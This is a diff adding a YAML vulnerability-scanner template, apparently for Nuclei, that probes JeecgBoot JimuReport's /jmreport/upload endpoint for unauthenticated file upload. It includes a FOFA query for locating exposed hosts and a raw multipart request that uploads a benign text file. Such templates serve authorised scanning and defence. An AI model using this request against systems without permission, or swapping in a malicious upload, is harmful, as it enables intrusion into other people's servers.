@@ -1,0 +1,54 @@
+id: jeecg-boot-jmreport-fileupload
+
+info:
+  name: 积木报表 jmreport/upload 未授权文件上传
+  author: free2e
+  severity: high
+  description: |
+    JeecgBoot 积木报表 /jmreport/upload 接口存在未授权文件上传，可上传任意文件。
+  metadata:
+    max-request: 2
+    fofa-query: body="/jmreport/"
+  tags: jeecg,jmreport,fileupload
+
+variables:
+  rboundary: '{{rand_base(8)}}'
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="aaa.txt"
+        Content-Type: text/html
+
+        test123456
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="fileName"
+
+        aaa.txt
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="biz"
+
+        excel_online
+        ------WebKitFormBoundary{{rboundary}}--
+
+    payloads:
+      path:
+        - /jeecg-boot/jmreport/upload
+        - /jmreport/upload
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"jimureport"'
+
+      - type: status
+        status:
+          - 200
